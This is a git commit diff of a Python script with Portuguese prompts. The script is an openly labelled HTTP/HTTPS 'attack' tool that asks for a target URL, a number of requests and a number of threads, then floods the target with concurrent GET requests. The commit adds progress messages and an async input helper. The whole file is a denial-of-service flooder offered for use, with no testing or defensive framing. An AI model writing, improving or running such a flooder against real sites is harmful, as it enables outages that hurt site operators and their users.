a5d87455a1fc7b04660d7727cc6944a32c9313f8
killthepomb <juliocst2405@gmail.com>
2024-05-16 08:48:17 -0300

    UpdateVERSAO2_4NG3L.py

--- VERSAO2_4NG3L.py
+++ VERSAO2_4NG3L.py
@@ -4,7 +4,8 @@ import asyncio
 async def send_request(url, session):
     try:
         async with session.get(url) as response:
-            pass  # Pode adicionar lógica de processamento da resposta aqui
+            print(f"Solicitação enviada para: {url}")
+            # Aqui pode adicionar lógica de processamento da resposta, se necessário
     except Exception as e:
         print(f"Erro ao enviar solicitação: {e}")
 
@@ -17,21 +18,26 @@ async def attack(url, num_requests, num_threads):
 
         await asyncio.gather(*tasks)
 
+async def get_user_input(prompt):
+    return input(prompt)
+
 async def main():
     print("Selecione o tipo de ataque:")
     print("1. Ataque HTTP")
     print("2. Ataque HTTPS")
-    choice = await asyncio.to_thread(lambda: int(input("Digite o número da sua escolha: ")))
+    choice = await get_user_input("Digite o número da sua escolha: ")
 
-    if choice == 1:
-        url = input("Insira o URL alvo: ")
-        num_requests = int(input("Insira o número de solicitações por thread: "))
-        num_threads = int(input("Insira o número de threads: "))
+    if choice == '1':
+        url = await get_user_input("Insira o URL alvo: ")
+        num_requests = int(await get_user_input("Insira o número de solicitações por thread: "))
+        num_threads = int(await get_user_input("Insira o número de threads: "))
+        print("Iniciando ataque HTTP...")
         await attack(url, num_requests, num_threads)
-    elif choice == 2:
-        url = input("Insira o URL alvo (HTTPS): ")
-        num_requests = int(input("Insira o número de solicitações por thread: "))
-        num_threads = int(input("Insira o número de threads: "))
+    elif choice == '2':
+        url = await get_user_input("Insira o URL alvo (HTTPS): ")
+        num_requests = int(await get_user_input("Insira o número de solicitações por thread: "))
+        num_threads = int(await get_user_input("Insira o número de threads: "))
+        print("Iniciando ataque HTTPS...")
         await attack(url, num_requests, num_threads)
     else:
         print("Opção inválida")
